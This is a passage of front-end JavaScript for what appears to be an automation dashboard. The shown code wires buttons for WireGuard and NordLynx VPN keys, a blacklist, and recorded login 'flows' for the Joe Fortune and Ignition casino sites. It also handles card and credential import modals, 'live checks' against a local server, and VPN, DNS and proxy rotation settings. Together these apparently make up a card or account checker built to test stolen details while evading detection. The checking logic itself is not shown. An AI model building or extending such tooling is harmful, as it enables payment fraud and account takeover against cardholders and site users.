        requeueOnFailure: false, maxRequeueCount: 2, batchDelayBetweenStartsMs: 500,
        pageLoadTimeout: 30, vpnRotation: false, dnsRotation: false, proxyRotateOnFailure: false,
      };
      state.selectedCardIds.clear(); state.selectedJoeIds.clear(); state.selectedIgnIds.clear();
      applyTheme('dark'); renderAll(); toast('All data reset', 'info');
    });
  });

  $('wgAddBtn')?.addEventListener('click', openWgPasteModal);
  $('closeWgPasteModal')?.addEventListener('click', closeWgPasteModal);
  $('cancelWgPaste')?.addEventListener('click', closeWgPasteModal);
  $('confirmWgPaste')?.addEventListener('click', confirmWgPaste);
  $('wgPasteModal')?.addEventListener('click', e => { if (e.target === $('wgPasteModal')) closeWgPasteModal(); });
  $('wgFileInput')?.addEventListener('change', handleWgFileImport);
  $('wgImportFileBtn')?.addEventListener('click', () => $('wgFileInput')?.click());

  $('wgConfigList')?.addEventListener('click', e => {
    const btn = e.target.closest('[data-wg-action]');
    if (!btn) return;
    const idx = parseInt(btn.dataset.wgIdx, 10);
    if (isNaN(idx)) return;
    if (btn.dataset.wgAction === 'delete') deleteWgConfig(idx);
    else if (btn.dataset.wgAction === 'toggle') toggleWgConfig(idx);
  });

  $('saveNordKeyBtn')?.addEventListener('click', () => {
    const val = $('nordKeyInput')?.value.trim();
    if (!val) { toast('Please paste your NordLynx access key', 'error'); return; }
    state.nordAccessKey = val;
    saveNordKey();
    $('nordKeyInput').value = '';
    toast('NordLynx access key saved', 'success');
    renderSettings();
  });
  $('deleteNordKeyBtn')?.addEventListener('click', () => {
    openConfirm('Remove NordLynx Key', 'Remove the saved NordLynx access key?', () => {
      state.nordAccessKey = ''; saveNordKey(); toast('NordLynx key removed', 'info'); renderSettings();
    });
  });

  $('blacklistImportBtn')?.addEventListener('click', importBlacklist);
  $('blacklistClearBtn')?.addEventListener('click', () => {
    if (state.blacklist.length === 0) { toast('Blacklist is already empty', 'info'); return; }
    openConfirm('Clear Blacklist', `Remove all ${state.blacklist.length} blacklist entr${state.blacklist.length === 1 ? 'y' : 'ies'}?`, () => {
      state.blacklist = []; saveBlacklist(); renderBlacklist(); toast('Blacklist cleared', 'info');
    });
  });
  $('blacklistList')?.addEventListener('click', e => {
    const id = e.target.closest('[data-bl-remove]')?.dataset.blRemove;
    if (id) removeBlacklistEntry(id);
  });

  $('joeFlowRecordBtn')?.addEventListener('click', () => startFlowRecording('joe'));
  $('ignFlowRecordBtn')?.addEventListener('click', () => startFlowRecording('ign'));
  $('joeFlowClearBtn')?.addEventListener('click', () => {
    openConfirm('Clear Joe Fortune Flow', 'Remove the recorded flow for Joe Fortune?', () => {
      state.joeFlow = null; saveFlow('joe', null); renderFlowRecorder(); toast('Joe Fortune flow cleared', 'info');
    });
  });
  $('ignFlowClearBtn')?.addEventListener('click', () => {
    openConfirm('Clear Ignition Flow', 'Remove the recorded flow for Ignition?', () => {
      state.ignFlow = null; saveFlow('ign', null); renderFlowRecorder(); toast('Ignition flow cleared', 'info');
    });
  });

  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') {
      if      (!$('importModal').classList.contains('hidden'))         closeImport();
      else if (!$('importCredModal').classList.contains('hidden'))     closeImportCred();
      else if (!$('cardDetailModal').classList.contains('hidden'))     closeCardDetail();
      else if (!$('credDetailModal').classList.contains('hidden'))     closeCredDetail();
      else if (!$('recordingsModal').classList.contains('hidden'))     closeRecordings();
      else if (!$('screenshotModal').classList.contains('hidden'))     closeScreenshots();
      else if (!$('confirmModal').classList.contains('hidden'))        closeConfirm();
      else if ($('wgPasteModal') && !$('wgPasteModal').classList.contains('hidden')) closeWgPasteModal();
    }
  });
}


// ── IP detection ───────────────────────────────────────────
/** @type {boolean} Set to true when user dismisses the IP banner — prevents re-show on async resolve. */
let _ipBannerDismissed = false;

/**
 * Fetches the user's public IP address and shows it in the IP banner.
 * BUG-05 fix: tracks _ipBannerDismissed flag — if user dismisses banner before fetch resolves,
 * the banner will not re-appear.
 * BUG-12 fix: uses manual AbortController + setTimeout instead of AbortSignal.timeout()
 * for Safari <16 compatibility.
 * BUG-17 fix: validates that the response string looks like an IP address before displaying.
 */
async function detectIP() {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 4000);
  try {
    const res = await fetch('https://api.ipify.org?format=json', { signal: ctrl.signal });
    const data = await res.json();
    const ip = data?.ip || '';
    if (!ip || !/^(\d{1,3}\.){3}\d{1,3}$|^[0-9a-f:]+$/i.test(ip)) return;
    if (_ipBannerDismissed) return;
    $('ipBannerText').textContent = `Your IP: ${ip}`;
    $('ipBanner').classList.remove('hidden');
    document.documentElement.style.setProperty('--ip-banner-h', '36px');
  } catch { /* non-blocking silent fail */ } finally { clearTimeout(t); }
}

// ── Boot ───────────────────────────────────────────────────
/**
 * Application entry point. Loads persisted state, applies theme, wires events,
 * renders the initial UI, and starts the optional async IP detection.
 */
function boot() {
  loadAll();
  applyTheme(state.settings.theme);
  wireEvents();
  renderAll();
  void detectIP();
  void checkServerStatus();
}

/**
 * Pings the automation API server to verify it is running and shows a toast
 * if it is unavailable. The webapp requires the Node.js server for live checks.
 */
async function checkServerStatus() {
  try {
    const resp = await fetch('/api/status', { signal: AbortSignal.timeout ? AbortSignal.timeout(4000) : undefined });
    if (resp.ok) {
      const data = await resp.json();
      if (data.mode === 'live') toast('🟢 Automation server online — live checks active', 'success', 3000);
    } else {
      toast('⚠️ Automation server error — run: npm start', 'error', 6000);
    }
  } catch {
    toast('⚠️ Automation server offline — run: npm start in project folder', 'error', 6000);
  }
}

boot();
